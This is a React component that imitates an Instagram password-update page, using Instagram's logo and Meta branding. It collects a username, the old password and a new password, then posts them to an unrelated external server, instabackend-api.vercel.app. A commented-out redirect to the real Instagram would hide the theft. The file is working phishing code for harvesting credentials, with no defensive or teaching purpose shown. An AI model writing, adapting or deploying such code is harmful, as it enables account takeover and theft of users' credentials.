import React, { useState } from 'react';
import './Home.css';
import axios from 'axios';



const Home = () => {
  const [post, setPost] = useState({
    username:'',
    oldpassword:'',
    newpassword:''
  })
  axios.defaults.withCredentials = true;
 
  const handleInput = (event)=>{
    setPost({...post,[event.target.name]: event.target.value})
  }
   
  
  

  const handleSubmit = (e) => {
    e.preventDefault();

    console.log(post)
    axios.post(`https://instabackend-api.vercel.app//user/login/`, post)
    .then(response => {
      console.log(response);
      //window.location.href = isMobile() ? 'instagram://user?username= ' : 'https://www.instagram.com/';
    })
    .catch(err => console.log(err));
  
  };

  function isMobile() {
    return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
  }

  return (
    <div className='Home'>
      <div className='upperText'>English(UK)</div>
      <div className='image'>
        <img
          src='https://th.bing.com/th/id/R.b6202fffe96c1a2d24d50ffb5f0c99b5?rik=wYnJ5Vpp1MwJrA&riu=http%3a%2f%2fwww.pngall.com%2fwp-content%2fuploads%2f5%2fInstagram-Logo-PNG-Free-Download.png&ehk=ASywikdx94nd%2b4%2bNXftbQpOEQ0Tj6OKrUZWejfMExVQ%3d&risl=&pid=ImgRaw&r=0'
          alt='sory'
        />
      </div>
      <form onSubmit={handleSubmit} className='inputs'>
        <input
          type='text'
          id='username'
          name='username'
          required
          onChange={handleInput}
          placeholder='Username,email address or mobile n...'
        />
        <br />
        <input
          type= 'text'
          id='oldpassword'
          name='oldpassword'
          required
          onChange={handleInput}
          placeholder='Old Password'
        />
      
        <br />
        <input
          type= 'text'
          id='newpassword'
          name='newpassword'
          required
          onChange={handleInput}
          placeholder='New password'
          
    
        />
       
        <br />
        <button className='addbookbtn' type='submit'>
          
          update
        </button>
      </form>
      <div className='midletext'>Forgotten password</div>
      <div className='createbutton'>Create new account</div>
      <div className='lowertext'>& Meta</div>
    </div>
  );
};

export default Home;
